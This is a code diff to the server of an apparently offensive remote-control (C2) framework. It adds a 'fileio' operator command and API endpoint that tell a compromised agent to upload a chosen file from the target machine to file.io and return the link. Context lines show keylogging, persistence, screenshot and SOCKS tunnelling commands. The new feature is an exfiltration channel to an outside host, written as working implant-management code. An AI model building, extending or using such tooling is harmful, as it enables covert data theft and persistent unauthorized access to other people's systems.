@@ -79,6 +79,13 @@ def _env_int(name: str, default: int) -> int:
 
 # Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
 MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)
+# Agent file.io uploads: max remote file size (lab default 100 MB).
+FILEIO_MAX_BYTES = _env_int("RMM_FILEIO_MAX_BYTES", 100 * 1024 * 1024)
+FILEIO_DEFAULT_EXPIRES = os.environ.get("RMM_FILEIO_DEFAULT_EXPIRES", "14d").strip().lower() or "14d"
+_FILEIO_EXPIRES_RE = re.compile(
+    r"^(1d|2d|3d|7d|14d|1w|2w|1m|2m|3m|6m|1y|\d+[dwmh])$",
+    re.IGNORECASE,
+)
 
 
 def secure_compare(provided: str, expected: str) -> bool:
@@ -90,6 +97,14 @@ def secure_compare(provided: str, expected: str) -> bool:
     a = provided.encode("utf-8", errors="replace")
     b = expected.encode("utf-8", errors="replace")
     return secrets.compare_digest(a, b)
+
+
+def normalize_fileio_expires(expires: str | None) -> str:
+    """Validate file.io expiry token; fall back to default."""
+    raw = (expires or FILEIO_DEFAULT_EXPIRES).strip().lower()
+    if _FILEIO_EXPIRES_RE.match(raw):
+        return raw
+    return FILEIO_DEFAULT_EXPIRES if _FILEIO_EXPIRES_RE.match(FILEIO_DEFAULT_EXPIRES) else "14d"
 
 
 _BEACON_SESSION_UUID_RE = re.compile(
@@ -247,7 +262,7 @@ class Completer:
         self.commands = [
             'list', 'use', 'info', 'background', 'kill',
             'set_sleep', 'set_jitter', 'show_config',
-            'download', 'upload', 'screenshot', 'socks',
+            'download', 'upload', 'fileio', 'screenshot', 'socks',
             'keylog', 'persist', 'stop',
             'install_persist', 'remove_persist',
             'help', 'clear', 'quit', 'exit',
@@ -621,6 +636,13 @@ class RMMServer:
         cmd = f"__DOWNLOAD__ {remote_path}"
         self.set_command(session.id, cmd, "oneshot")
         self.note_download_queued(session, remote_path)
+        return cmd
+
+    def queue_agent_fileio(self, session, remote_path: str, expires: str | None = None) -> str:
+        """Queue __FILEIO__ on the agent (upload remote file to file.io)."""
+        exp = normalize_fileio_expires(expires)
+        cmd = f"__FILEIO__ {remote_path} {exp}"
+        self.set_command(session.id, cmd, "oneshot")
         return cmd
 
     def _history_meta_path(self, session_id: str) -> str:
@@ -1170,6 +1192,25 @@ class RMMServer:
             event_body = result
             tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))
 
+        elif cmd_type == "fileio_upload":
+            try:
+                data = json.loads(result)
+                remote_path = (data.get("remote_path") or "").strip()
+                echoed_cmd = f"__FILEIO__ {remote_path}".strip()
+                if data.get("success"):
+                    link = (data.get("link") or "").strip()
+                    if not link and data.get("key"):
+                        link = f"https://file.io/{data.get('key')}"
+                    event_body = f"{remote_path} → {link}" if link else remote_path
+                    tty_lines.append(("log", f"file.io upload: {link or remote_path}", "SUCCESS"))
+                else:
+                    err = data.get("error") or "file.io upload failed"
+                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
+                    tty_lines.append(("log", f"file.io upload failed: {err}", "ERROR"))
+            except Exception as e:
+                event_body = str(e)
+                tty_lines.append(("log", f"file.io result error: {e}", "ERROR"))
+
         else:
             text, echoed_cmd = self._unwrap_rmm_result_text(result)
             event_body = text
@@ -1610,6 +1651,30 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
             return True
 
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "fileio":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            remote_path = body.get("remote_path", "").strip()
+            if not remote_path:
+                self._json(400, {"error": "missing_remote_path"})
+                return True
+            expires = body.get("expires")
+            cmd = srv.queue_agent_fileio(session, remote_path, expires=expires)
+            srv.record_operator_action(session, cmd, "fileio")
+            self._json(
+                200,
+                {
+                    "ok": True,
+                    "session_id": session.id,
+                    "queued": cmd,
+                    "max_bytes": FILEIO_MAX_BYTES,
+                    "expires": normalize_fileio_expires(expires),
+                },
+            )
+            return True
+
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "screenshot":
             session = srv.resolve_session(parts[1])
             if not session:
@@ -1999,6 +2064,7 @@ class CommandInterface:
 
 {Colors.CYAN}File Operations:{Colors.END}
   {Colors.GREEN}download <file>{Colors.END}          - Download file from target
+  {Colors.GREEN}fileio <file> [expires]{Colors.END}  - Upload remote file to file.io (ephemeral link)
   {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target
 
 {Colors.CYAN}Tunneling:{Colors.END}
@@ -2199,6 +2265,25 @@ class CommandInterface:
                         self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                 else:
                     self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")
+
+            elif cmd == "fileio":
+                if args:
+                    session = self.server.get_session(self.server.current_session)
+                    if not session:
+                        self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
+                    else:
+                        expires = None
+                        if len(args) >= 2 and _FILEIO_EXPIRES_RE.match(args[-1]):
+                            expires = args[-1]
+                            filepath = " ".join(args[:-1])
+                        else:
+                            filepath = " ".join(args)
+                        self.server.queue_agent_fileio(session, filepath, expires=expires)
+                        self.server.tty_print(
+                            f"{Colors.DIM}file.io upload queued for {filepath}...{Colors.END}"
+                        )
+                else:
+                    self.server.tty_print(f"{Colors.RED}Usage: fileio <remote_file> [expires]{Colors.END}")
 
             elif cmd == "upload":
                 if len(args) >= 2:
